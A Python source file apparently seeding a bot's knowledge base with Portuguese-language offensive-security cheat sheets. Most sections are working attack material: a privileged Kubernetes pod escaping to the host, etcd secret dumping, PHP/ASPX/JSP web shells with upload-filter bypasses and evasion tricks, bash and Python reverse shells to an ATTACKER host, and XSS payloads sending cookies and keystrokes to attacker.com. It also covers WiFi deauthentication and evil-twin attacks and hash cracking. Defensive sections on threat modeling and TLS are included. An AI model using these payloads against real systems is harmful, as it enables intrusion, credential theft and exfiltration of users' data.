  kind: Pod
  metadata:
    name: privesc
  spec:
    hostPID: true
    hostNetwork: true
    containers:
    - name: privesc
      image: ubuntu
      command: ["nsenter","--mount=/proc/1/ns/mnt","--","bash"]
      securityContext:
        privileged: true
      volumeMounts:
      - mountPath: /host
        name: host-root
    volumes:
    - name: host-root
      hostPath:
        path: /
  EOF
  kubectl exec -it privesc -- bash    # shell no nó host

  # 2. Ler secrets (se tens get secrets)
  kubectl get secret <nome> -o jsonpath='{.data.password}' | base64 -d
  # Procurar credenciais de admin ou outros service accounts

  # 3. Impersonation (se tens impersonate)
  kubectl get pods --as=system:admin
  kubectl --as=system:serviceaccount:kube-system:default get secrets

  # 4. Patch de ClusterRoleBinding (se tens patch)
  kubectl patch clusterrolebinding cluster-admin \
    --patch '{"subjects":[{"kind":"ServiceAccount","name":"default","namespace":"default"}]}'

## Ataques à Supply Chain K8s
  # Imagens maliciosas em registos privados
  # Modificar ConfigMaps com código malicioso
  # Injectar sidecars maliciosos em deployments

## Exfiltração de Segredos
  # etcd sem autenticação (porta 2379)
  etcdctl --endpoints=http://etcd:2379 get / --prefix --keys-only
  etcdctl --endpoints=http://etcd:2379 get /registry/secrets --prefix
  # etcd guarda TODOS os segredos do cluster em claro (se sem encriptação)

## Movimentação Lateral entre Pods/Namespaces
  # Scan da rede interna do cluster
  nmap -sn 10.0.0.0/8                 # range típico de pods
  # Aceder a serviços internos via DNS K8s
  curl http://service-name.namespace.svc.cluster.local
  # Roubar tokens de outros pods (se acesso ao nó)
  find /var/lib/kubelet/pods -name token 2>/dev/null

## CVEs Kubernetes
  CVE-2018-1002105 → privilege escalation via API server
  CVE-2019-11247  → RBAC bypass em custom resources
  CVE-2020-8559   → node redirect attack
  CVE-2022-3294   → node address auth bypass

## Ferramentas
  kubectl          → CLI oficial
  kubeletctl       → atacar kubelet API directamente
  kube-hunter      → scan de vulnerabilidades K8s (Aqua)
  kube-bench       → audit CIS benchmark
  peirates         → framework de pentest K8s
  kubiscan         → scan de RBAC permissions perigosas
  Trivy            → scan de imagens e configs K8s""", {"category": "kubernetes"}),

    ("http_smuggling", """HTTP Request Smuggling:

## Conceito
  Explorar discrepância entre frontend (proxy/CDN) e backend na interpretação de Content-Length vs Transfer-Encoding.
  O frontend vê um request; o backend vê dois → "envenenar" o início do próximo request de outro utilizador.

## Tipos
  CL.TE  → frontend usa Content-Length, backend usa Transfer-Encoding
  TE.CL  → frontend usa Transfer-Encoding, backend usa Content-Length
  TE.TE  → ambos usam TE mas um pode ser confundido com obfuscação

## Detecção (Burp Suite)
  HTTP Request Smuggler extension (PortSwigger)
  Enviar request ambíguo → medir timing (atraso indica vulnerabilidade)
  Método: timing-based detection
    POST / HTTP/1.1
    Content-Length: 6
    Transfer-Encoding: chunked
    3
    abc
    X  ← backend espera mais dados → timeout confirma TE.CL

## Exploração CL.TE
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 13
  Transfer-Encoding: chunked

  0

  SMUGGLED

  → "SMUGGLED" fica no início do próximo request de outro user

## Casos de uso reais
  - Bypass de autenticação via request prefix injection
  - Capture de requests de outros utilizadores (roubar cookies/tokens)
  - Bypass de WAF (request malicioso escondido no chunk)
  - XSS refletido via envenenamento de response

## Ferramentas
  Burp Suite Pro → HTTP Request Smuggler extension
  smuggler.py    → https://github.com/defparam/smuggler
  h2csmuggler    → HTTP/2 to HTTP/1 downgrade smuggling""", {"category": "web"}),

    ("web_cache_poisoning", """Web Cache Poisoning:

## Conceito
  Manipular o cache de um servidor/CDN para servir responses maliciosas a outros utilizadores.
  Cache guarda response com chave (URL + headers específicos).
  Injectar payload em headers "unkeyed" que são reflectidos na response.

## Descoberta
  # Identificar headers unkeyed (não fazem parte da cache key)
  X-Forwarded-Host: evil.com
  X-Forwarded-Scheme: http
  X-Forwarded-Port: 1337
  X-Original-URL: /admin
  X-Rewrite-URL: /admin

  # Ferramentas
  param-miner (Burp extension) → descobre headers/parâmetros unkeyed automaticamente
  Cache-Control: no-store → forçar miss para testar sem envenenar

## Exploração Básica
  # Se X-Forwarded-Host é reflectido em JS ou redirect:
  GET / HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com
  → response contém: <script src="https://evil.com/script.js">
  → quando cacheado, todos os utilizadores carregam o script malicioso

## Web Cache Deception
  Inverso do poisoning: forçar cache a guardar dados privados
  GET /profile/nonexistent.css HTTP/1.1
  → servidor retorna página /profile (dados privados)
  → cache guarda porque extensão .css é cacheável
  → atacante acede ao URL cacheado e vê os dados da vítima

## Parâmetros Fat GET
  GET /?utm_x=1 HTTP/1.1
  Body: param=value
  → alguns caches ignoram body → injectar parâmetros no body

## Ferramentas
  Burp Suite + Param Miner
  Web Cache Vulnerability Scanner: https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner""", {"category": "web"}),

    ("subdomain_takeover", """Subdomain Takeover:

## Conceito
  Subdomínio aponta (CNAME) para serviço externo que foi removido/expirou.
  Atacante regista o serviço → controla o subdomínio da vítima.
  Permite: phishing no domínio legítimo, roubo de cookies, bypass CSP.

## Serviços Vulneráveis Comuns
  GitHub Pages   → "There isn't a GitHub Pages site here"
  Heroku         → "No such app"
  AWS S3         → "NoSuchBucket"
  Azure          → "404 Web Site not found"
  Netlify        → sem site configurado
  Shopify        → "Sorry, this shop is currently unavailable"
  Fastly         → "Fastly error: unknown domain"
  Pantheon       → "404 error unknown site!"
  Tumblr         → "There's nothing here"

## Detecção
  # Verificar CNAME dangling
  dig sub.target.com CNAME              # ver para onde aponta
  # Se CNAME aponta para serviço com erro → vulnerável

  # Ferramentas automáticas
  subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl
  subzy run --targets subdomains.txt
  nuclei -t takeovers/ -l subdomains.txt
  can-i-take-over-xyz (GitHub) → lista de fingerprints por serviço

## Exploração
  # GitHub Pages
  1. Criar repo: <username>.github.io ou com nome específico
  2. Settings → Pages → Custom domain → sub.target.com
  3. Criar CNAME file com sub.target.com
  → GitHub serve o teu conteúdo no subdomínio da vítima

  # AWS S3
  aws s3api create-bucket --bucket sub-target-com --region us-east-1
  # Upload conteúdo malicioso
  # Configurar como Static Website

## Impacto Real
  - Phishing credencial no domínio oficial
  - Bypass de Same-Origin Policy (partilham cookies de .target.com)
  - Bypass de CSP que permite o próprio domínio
  - OAuth redirect_uri hijacking

## Ferramentas
  subfinder + httpx + nuclei (pipeline completo)
  subjack, subzy, can-i-take-over-xyz""", {"category": "recon"}),

    ("password_cracking", """Password Cracking - Hashcat & John the Ripper:

## Identificar o Tipo de Hash
  hashid hash.txt                        # identificar tipo
  hash-identifier                        # interativo
  # Exemplos:
  5f4dcc3b5aa765d61d8327deb882cf99       → MD5
  $2y$10$...                             → bcrypt
  $6$salt$...                            → SHA-512 crypt (Linux)
  NTML: aad3b435b51404eeaad3b435b51404ee → NTLM
  $krb5tgs$23$...                        → Kerberoast (TGS)

## Hashcat - Modos Essenciais
  # -m = hash type, -a = attack mode
  hashcat -m 0    hash.txt wordlist.txt           # MD5 + wordlist
  hashcat -m 1000 hash.txt wordlist.txt           # NTLM
  hashcat -m 1800 hash.txt wordlist.txt           # SHA-512crypt (Linux)
  hashcat -m 3200 hash.txt wordlist.txt           # bcrypt (LENTO)
  hashcat -m 13100 hash.txt wordlist.txt          # Kerberoast TGS
  hashcat -m 18200 hash.txt wordlist.txt          # AS-REP Roast
  hashcat -m 22000 hash.txt wordlist.txt          # WPA2

  # Modos de ataque (-a)
  -a 0  Wordlist (dicionário)
  -a 1  Combinação (wordlist1 + wordlist2)
  -a 3  Brute-force / Mask
  -a 6  Wordlist + Mask
  -a 7  Mask + Wordlist

## Regras (Mutações de Passwords)
  hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule
  hashcat -m 0 hash.txt wordlist.txt -r rules/rockyou-30000.rule
  # Regras comuns: best64, dive, rockyou-30000, OneRuleToRuleThemAll
  # Exemplos de regras:
  $1    → adiciona "1" no fim (password → password1)
  ^!    → adiciona "!" no início
  c     → capitaliza (password → Password)
  l     → lowercase tudo
  u     → uppercase tudo
  r     → reverse (password → drowssap)

## Masks (Brute-force Inteligente)
  ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special, ?a = all
  hashcat -m 0 hash.txt -a 3 ?u?l?l?l?l?d?d?d?s  # Padrão tipo "Pass123!"
  hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d?d?d     # 8 dígitos
  # Incrementar comprimento
  hashcat -m 0 hash.txt -a 3 --increment --increment-min=6 ?a?a?a?a?a?a?a?a

## John the Ripper
  john --wordlist=rockyou.txt hashes.txt          # wordlist
  john --format=NT hashes.txt --wordlist=list.txt  # NTLM
  john --format=bcrypt hashes.txt                  # bcrypt
  john --show hashes.txt                           # ver passwords crackeadas
  # Extrair hashes de ficheiros
  zip2john arquivo.zip > hash.txt && john hash.txt
  pdf2john documento.pdf > hash.txt && john hash.txt
  keepass2john database.kdbx > hash.txt && john hash.txt
  ssh2john id_rsa > hash.txt && john hash.txt

## Wordlists Recomendadas
  rockyou.txt           → 14M passwords reais (clássico)
  SecLists/Passwords/   → colecção variada
  kaonashi.txt          → passwords de leaks recentes
  weakpass              → coleção enorme de leaks
  # Gerar wordlist customizada
  cewl http://target.com -d 3 -m 5 -w wordlist.txt  # crawl do site alvo
  crunch 8 10 abcdef123 -o custom.txt               # geração por charset""", {"category": "techniques"}),

    ("wifi_hacking", """WiFi Hacking - WPA2/WPA3:

## Setup
  # Colocar interface em modo monitor
  airmon-ng start wlan0                  # criar wlan0mon
  iwconfig wlan0 mode monitor           # alternativa manual
  # Verificar interferências
  airmon-ng check kill                   # matar processos conflito

## Reconnaissance
  airodump-ng wlan0mon                   # listar redes
  airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
  # Guardar captura num ficheiro para crack offline

## WPA2 - Captura do 4-Way Handshake
  # Aguardar cliente ligar (passivo) ou forçar desauth
  aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
  # -0 = deauth, 5 = número de pacotes
  # Quando cliente re-liga → captura o handshake no airodump

## WPA2 - Crack do Handshake
  aircrack-ng capture-01.cap -w rockyou.txt
  hashcat -m 22000 handshake.hc22000 rockyou.txt    # converter primeiro:
  hcxpcapngtool -o handshake.hc22000 capture-01.cap

## PMKID Attack (sem desauth, sem aguardar cliente)
  hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
  hcxpcapngtool -o hash.hc22000 capture.pcapng
  hashcat -m 22000 hash.hc22000 rockyou.txt
  # Mais eficaz: captura PMKID do AP directamente sem necessitar cliente

## Evil Twin / Rogue AP
  hostapd-wpe   → AP falso com captive portal para capturar credenciais
  airbase-ng -e "FreeWiFi" -c 6 wlan0mon
  # Redirigir DNS → página de phishing
  # MITM automático no tráfego dos clientes

## WPA3 (Dragonblood)
  CVE-2019-9494 → side-channel timing attack no handshake SAE
  CVE-2019-9496 → bypass de confirmação SAE
  Dragonblood toolkit: https://github.com/vanhoefm/dragonblood
  # Na prática: WPA3 muito mais robusto, foco em WPA2 mixed-mode

## WPS Attacks
  wash -i wlan0mon                       # encontrar APs com WPS activo
  reaver -i wlan0mon -b <BSSID> -vv     # brute force WPS PIN (8 dígitos)
  bully -b <BSSID> -e <ESSID> wlan0mon  # alternativa ao reaver
  # Muitos APs têm lockout após falhas → demorado

## Ferramentas
  aircrack-ng suite    → captura + crack WPA2
  hcxdumptool          → PMKID + handshake moderno
  hashcat              → crack GPU-accelerated
  hostapd-wpe          → rogue AP enterprise
  wifiphisher          → automated social engineering WiFi
  bettercap            → WiFi scanning + MITM""", {"category": "network"}),

    ("recon_automation", """Recon Automatizado - Pipeline Completo:

## Pipeline Básico (Bug Bounty / Pentest)
  target.com
    ↓ Subdomain Enumeration
    ↓ Live Host Detection
    ↓ Port Scanning
    ↓ Service Fingerprinting
    ↓ Web Tech Detection
    ↓ Screenshot
    ↓ Vulnerability Scan

## Subdomain Enumeration
  # Passivo (sem contactar o alvo)
  subfinder -d target.com -o subs.txt           # múltiplas fontes passivas
  amass enum -passive -d target.com -o subs.txt # OSINT massivo
  assetfinder --subs-only target.com >> subs.txt
  # Activo (DNS bruteforce)
  amass enum -active -brute -d target.com -w wordlist.txt
  puredns bruteforce wordlist.txt target.com -r resolvers.txt
  # Certificate Transparency
  curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'

## Live Host Detection
  cat subs.txt | httpx -o live.txt              # filtrar hosts activos
  cat subs.txt | httpx -status-code -title -tech-detect -o live_details.txt
  # httpx: testar HTTP/HTTPS, seguir redirects, detectar tecnologias

## Port Scanning Massivo
  naabu -l live.txt -o ports.txt                # port scanner rápido
  masscan -iL live.txt -p0-65535 --rate=1000 -oL ports.txt
  # Depois passar os ports abertos ao nmap para fingerprinting
  nmap -sV -sC -iL live.txt -p $(cat ports.txt | cut -d: -f2 | tr '\n' ',')

## Screenshots Automáticos
  gowitness file -f live.txt -P screenshots/    # screenshot de cada URL
  eyewitness --web -f live.txt --no-prompt

## Nuclei - Vulnerability Scanning
  nuclei -l live.txt -t ~/nuclei-templates/ -o vulns.txt
  nuclei -l live.txt -t cves/ -t exposures/ -t misconfigurations/
  nuclei -l live.txt -severity critical,high -o critical.txt
  # Templates: https://github.com/projectdiscovery/nuclei-templates

## Fuzzing de Parâmetros
  cat live.txt | waybackurls | grep "=" | qsreplace FUZZ | \
    httpx -mr "error|exception|warning" -o reflected.txt
  gau target.com | grep "=" | qsreplace "'\"><img src=x>" | \
    httpx -mr "'\"><img" -o xss.txt

## JavaScript Recon
  cat live.txt | getJS --complete | grep -E "api_key|secret|token|password"
  linkfinder.py -i https://target.com -d -o cli
  subjs -i live.txt | xargs -I{} linkfinder.py -i {} -o cli

## Ferramentas do ProjectDiscovery (Suite Completa)
  subfinder  → subdomain discovery
  httpx      → HTTP probing
  naabu      → port scanning
  nuclei     → vulnerability scanning
  dnsx       → DNS resolution
  notify     → alertas (Slack, Discord, Telegram)
  # Instalar tudo: go install -v github.com/projectdiscovery/...@latest""", {"category": "recon"}),

    ("web_shells", """Web Shells - Upload e Execução Remota:

## Tipos de Web Shell

## PHP (mais comum)
  # Minimal one-liner
  <?php system($_GET['cmd']); ?>
  <?php passthru($_GET['cmd']); ?>
  <?php echo shell_exec($_GET['c']); ?>
  # Com autenticação básica
  <?php if($_GET['pass']=='secret'){system($_GET['cmd']);} ?>
  # Upload via curl
  curl "http://target/shell.php?cmd=id"
  curl "http://target/shell.php?cmd=cat+/etc/passwd"

## ASPX (.NET)
  <%@ Page Language="C#" %>
  <% System.Diagnostics.Process.Start("cmd.exe", "/c "+Request["cmd"]); %>

## JSP (Java)
  <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

## Bypass de Upload Filters
  # Extensões alternativas PHP:
  .php, .php3, .php4, .php5, .phtml, .pht, .phps, .shtml
  # Double extension: shell.php.jpg (se só verifica última extensão)
  # Null byte: shell.php%00.jpg (PHP antigo)
  # MIME type spoofing: Content-Type: image/jpeg com código PHP
  # Magic bytes: adicionar GIF89a; no início do ficheiro PHP
  # Case variation: shell.PhP, shell.PHP
  # Htaccess upload: fazer AddType application/x-httpd-php .jpg

## Ferramentas de Web Shell
  # Weevely - shell PHP encriptada e furtiva
  weevely generate password shell.php        # gerar shell
  weevely http://target/shell.php password   # conectar
  # China Chopper - shell tiny (2 bytes no servidor)
  # Antak - ASPX shell com funcionalidades avançadas

## Reverse Shell a partir de Web Shell
  # Linux
  bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'
  # URL encode o payload antes de enviar:
  curl "http://target/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/IP/4444+0>%261'"

## Upgrade de Shell
  # Shell básica → TTY interativo
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  Ctrl+Z → stty raw -echo → fg
  export TERM=xterm

## Evasão de Detecção
  # Encoding do código
  eval(base64_decode("...")); // PHP
  # Variáveis para esconder funções
  $f = 'sys'.'tem'; $f($_GET['c']);
  # Usar funções menos monitorizadas: proc_open, popen
  # Injectar em ficheiros legítimos (não criar novo ficheiro)""", {"category": "web"}),

    ("heap_exploitation", """Heap Exploitation:

## Conceito
  Heap: memória alocada dinamicamente (malloc/free)
  Vulnerabilidades: heap overflow, use-after-free (UAF), double free, format string
  Objectivo: corromper metadata do heap para controlar alocações futuras

## Estrutura do Heap (glibc ptmalloc)
  chunk: {prev_size | size | fd | bk | dados}
  bins: fast bins, unsorted bin, small bins, large bins, tcache (glibc 2.26+)
  tcache: cache por-thread, 7 chunks por size class (glibc moderno)

## Heap Overflow
  # Sobrescrever metadata do chunk seguinte
  # Manipular size field → criar chunk falso
  # Manipular fd/bk pointers em bins → arbitrary write
  # Técnica: house of force, house of spirit, house of lore

## Use-After-Free (UAF)
  # 1. Alocar chunk A
  # 2. Libertar chunk A → vai para tcache/bin
  # 3. Alocar chunk B do mesmo tamanho → reutiliza chunk A
  # 4. Ponteiro antigo para A ainda usado → lê/escreve em B
  # Primitiva poderosa para type confusion

## tcache Poisoning (glibc >= 2.26)
  # Mais fácil que técnicas antigas
  # 1. Libertar 2 chunks do mesmo tamanho → entram no tcache
  # 2. Sobrescrever fd pointer do primeiro chunk → apontar para target
  # 3. Próximas 2 alocações: devolve target como chunk
  # Resultado: malloc retorna endereço arbitrário → write primitive

## Double Free
  free(ptr); free(ptr);   // UB → corrompe lista tcache
  # Cria ciclo na lista encadeada
  # Permite obter o mesmo chunk duas vezes em alocações futuras

## Ferramentas de Debug
  pwndbg / peda → visualização do heap
    heap          # listar chunks
    bins          # estado dos bins
    vis_heap_chunks  # visualização visual
  gef → alternativa com boas funcionalidades heap

## pwntools para Heap Exploits
  from pwn import *
  p = process('./vuln')
  # Primitivas comuns:
  alloc(size)          # wrapper para malloc
  free(idx)            # wrapper para free
  edit(idx, data)      # write primitive
  show(idx)            # read primitive → lidar informação

## Mitigações e Bypass
  Safe-Linking (glibc 2.32+): fd pointers são XOR com endereço do chunk
    → bypass: leak de heap address → XOR com target
  tcache key: detecta double free
    → bypass: sobrescrever key field antes do segundo free""", {"category": "exploit_dev"}),

    ("bug_bounty", """Bug Bounty - Metodologia e Dicas:

## Plataformas
  HackerOne (h1), Bugcrowd, Intigriti, YesWeHack, Synack (invite-only)
  Programas próprios: Google VRP, Microsoft MSRC, Apple, Meta

## Metodologia de Abordagem

## 1. Recon Profundo
  subfinder + amass → todos os subdomínios
  httpx → filtrar vivos + detectar tecnologias
  Procurar: portais admin, staging, dev, api, internal
  GitHub recon: org:empresa "api_key" OR "secret" OR "password"
  shodan: org:"empresa" → IPs não listados no scope

## 2. Mapping da Superfície de Ataque
  Crawl completo: gospider, hakrawler, katana
  JS analysis: LinkFinder, SecretFinder
  Parâmetros: arjun, paramspider
  Endpoints antigos: waybackurls, gau

## 3. Vulnerabilidades de Alto Impacto (Maior $$$)
  IDOR → aceder/modificar dados de outros utilizadores
  SSRF → acesso a recursos internos (metadata AWS = critical)
  RCE → execução de código (max bounty)
  Auth bypass → acesso sem credenciais
  SQLi → exfiltração de dados
  Stored XSS em funcionalidades críticas

## 4. Vulnerabilidades Médias (Bounty consistente)
  Reflected XSS com impacto demonstrável
  CSRF em acções sensíveis (sem SameSite cookie)
  Open Redirect (base para phishing)
  Subdomain Takeover
  Exposição de informação sensível (tokens, PII)
  Rate limiting ausente em funções críticas

## Dicas para Maximizar Bounty
  Encadear vulnerabilidades: SSRF + IDOR = maior impacto
  Demonstrar impacto real: não reportar "XSS em campo isolado"
  PoC claro e reproduzível: vídeo ou steps detalhados
  Respeitar o scope rigorosamente
  Duplicate? Tenta variações ou componentes diferentes

## Report de Qualidade
  Título: [Componente] Tipo de Vuln - Impacto resumido
  Severity: usar CVSS ou guidelines do programa
  Steps: enumerados, numerados, reproduzíveis
  Impact: o que um atacante pode fazer realmente
  PoC: código, payload, screenshot/vídeo
  Remediation: sugestão concreta

## Automação Contínua
  # Monitorizar novos subdomínios (alert para novos assets)
  # Re-scan periódico com nuclei para novos CVEs
  # GitHub monitor: github-dorker, trufflehog em repos novos
  # notify (ProjectDiscovery) → alertas em tempo real no Telegram""", {"category": "methodology"}),

    ("threat_modeling", """Threat Modeling - STRIDE & MITRE ATT&CK:

## STRIDE (Microsoft)
  S — Spoofing        → falsificar identidade
  T — Tampering       → modificar dados em trânsito/repouso
  R — Repudiation     → negar acção realizada
  I — Info Disclosure → expor dados não autorizados
  D — Denial of Service → tornar sistema indisponível
  E — Elevation of Privilege → obter mais permissões

  Para cada componente do sistema: identificar ameaças STRIDE aplicáveis
  Data Flow Diagrams (DFD) → mapear fluxos de dados e trust boundaries

## MITRE ATT&CK Framework
  https://attack.mitre.org
  Táticas (o QUÊ): Recon, Resource Dev, Initial Access, Execution,
    Persistence, Privilege Escalation, Defense Evasion,
    Credential Access, Discovery, Lateral Movement,
    Collection, C2, Exfiltration, Impact
  Técnicas (o COMO): T1059 (Command Scripting), T1078 (Valid Accounts), etc.

## Uso Prático ATT&CK
  # Red Team: mapear TTPs do engagement para ATT&CK
  # Blue Team: identificar lacunas de detecção
  # Threat Intel: correlacionar TTPs de APT groups com defesas existentes
  # ATT&CK Navigator → visualizar cobertura de detecção

## PASTA (Process for Attack Simulation and Threat Analysis)
  7 fases: Objetivos → Âmbito técnico → Decomposição da app
         → Análise de ameaças → Análise de vulnerabilidades
         → Modelação de ataques → Análise de risco/impacto

## Ferramentas
  OWASP Threat Dragon  → DFD + STRIDE automatizado
  Microsoft Threat Modeling Tool
  IriusRisk            → enterprise threat modeling
  ATT&CK Navigator     → https://mitre-attack.github.io/attack-navigator/""", {"category": "methodology"}),

    ("ssl_tls_attacks", """SSL/TLS - Ataques e Análise:

## Ferramentas de Análise
  sslscan target.com               # cifras, protocolos, certificado
  testssl.sh target.com            # análise muito detalhada
  nmap --script ssl-enum-ciphers -p 443 target.com
  openssl s_client -connect target.com:443 -tls1  # testar protocolos

## Vulnerabilidades Clássicas

## POODLE (CVE-2014-3566)
  SSLv3 com CBC padding oracle
  Detecção: sslscan → "SSLv3 enabled"
  Exploração: força downgrade para SSLv3 em HTTPS
  Fix: desactivar SSLv3

## BEAST (CVE-2011-3389)
  TLS 1.0 CBC IV previsível
  Relevante em browsers antigos + TLS 1.0 activo

## CRIME / BREACH (CVE-2012-4929 / CVE-2013-3587)
  Compressão TLS/HTTP permite recuperar cookies via oráculo de compressão
  Fix: desactivar compressão TLS; mitigar BREACH com CSRF tokens variáveis

## Heartbleed (CVE-2014-0160)
  OpenSSL heartbeat extension → leitura de memória do servidor (64KB por vez)
  Pode expor: chaves privadas, sessões, passwords em memória
  Detecção: nmap --script ssl-heartbleed -p 443 target.com
  Exploração: heartbleed PoC scripts no GitHub

## ROBOT (CVE-2017-13099)
  Return Of Bleichenbacher's Oracle Threat
  RSA PKCS#1 v1.5 padding oracle em TLS
  Permite decifrar tráfego e assinar mensagens com chave do servidor
  Detecção: robot-detect tool (Facebook Research)

## Sweet32 (CVE-2016-2183)
  Cifras de 64-bit (3DES, Blowfish) → birthday attack após 768GB
  Fix: desactivar 3DES

## DROWN (CVE-2016-0800)
  SSLv2 activo no mesmo certificado que TLS → compromete TLS
  Detecção: sslscan → "SSLv2 enabled"

## Certificate Issues
  # Verificar cadeia de certificados
  openssl s_client -connect target.com:443 -showcerts
  # Verificar expiração
  echo | openssl s_client -connect target.com:443 2>/dev/null | \
    openssl x509 -noout -dates
  # Verificar Subject Alternative Names
  openssl s_client -connect target.com:443 2>/dev/null | \
    openssl x509 -noout -text | grep -A1 "Subject Alternative"
  # Verificar se certificado é de confiança + OCSP
  openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt cert.pem""", {"category": "network"}),

    ("xss_advanced", """XSS Avançado - Bypasses e Técnicas:

## Tipos de XSS
  Reflected  → payload no request, reflectido na response
  Stored     → payload guardado na BD, executado por outros users
  DOM-based  → manipulação do DOM via JS no cliente (sem ir ao servidor)
  Blind XSS  → executa no painel admin/suporte (não vês a execução)

## Blind XSS
  # Ferramentas: XSS Hunter, ezXSS, Canarytokens
  # Payload que exfiltra contexto quando executado:
  "><script src="https://xss.ht/YOUR_ID"></script>
  # Captura: cookies, URL, innerHTML, screenshot, IP

## Bypass de Filtros WAF/Sanitização

## Encoding
  <script>alert(1)</script>                    # básico
  <script>alert\u0028\u00311\u0029</script>    # unicode escape
  <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">  # HTML entities
  <script>eval(atob('YWxlcnQoMSk='))</script>  # base64

## Tags Alternativas
  <svg onload=alert(1)>
  <details open ontoggle=alert(1)>
  <video src onerror=alert(1)>
  <input autofocus onfocus=alert(1)>
  <select autofocus onfocus=alert(1)>
  <textarea autofocus onfocus=alert(1)>
  <keygen autofocus onfocus=alert(1)>
  <marquee onstart=alert(1)>

## Bypass de Aspas
  <img src=x onerror=alert`1`>          # template literals
  <img src=x onerror=alert(String.fromCharCode(88,83,83))>

## Content-Type Bypass
  # Se reflectido em JSON: ",":<script>alert(1)</script>//
  # Se reflectido em JS: \u003cscript\u003ealert(1)\u003c/script\u003e
  # SVG como upload → <svg xmlns="..."><script>alert(1)</script></svg>

## XSS para Account Takeover
  # Roubar cookie de sessão
  <script>document.location='https://attacker.com/?c='+document.cookie</script>
  # Roubar token CSRF + fazer request
  <script>
  fetch('/api/change-email',{method:'POST',headers:{'Content-Type':'application/json',
  'X-CSRF-Token':document.querySelector('[name=csrf]').value},
  body:'{"email":"attacker@evil.com"}'});
  </script>
  # Keylogger
  <script>document.onkeypress=e=>fetch('//attacker/?k='+e.key)</script>

## DOM XSS - Sinks Perigosos
  document.write(), document.writeln()
  innerHTML, outerHTML
  eval(), setTimeout(), setInterval() com string
  location.href = userInput
  # Sources: location.search, location.hash, document.referrer, postMessage""", {"category": "web"}),
]


def init_kb():
    # carrega memory.md como documento na KB
    memory_path = os.path.join(os.path.dirname(__file__), "memory.md")
    if os.path.exists(memory_path):
        with open(memory_path, "r", encoding="utf-8") as f:
            add_document("bot_memory", f.read(), {"category": "identity"})

    for doc_id, content, meta in INITIAL_KB:
        add_document(doc_id, content, meta)
